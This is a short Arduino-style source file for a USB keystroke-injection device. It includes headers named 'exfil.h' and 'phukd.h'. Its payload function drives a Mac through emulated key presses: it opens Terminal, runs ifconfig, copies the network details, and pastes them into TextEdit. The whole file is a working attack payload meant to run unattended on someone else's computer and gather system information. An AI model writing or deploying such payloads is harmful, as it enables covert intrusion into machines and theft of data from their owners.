#include "exfil.h"
#include "phukd.h"

void payload() {
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("terminal");
  delay(3000);
  Keyboard.println("ifconfig");
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write('a');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write('c');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write('q');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("textedit");
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write('a');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write('v');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write('q');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("default_config");
}
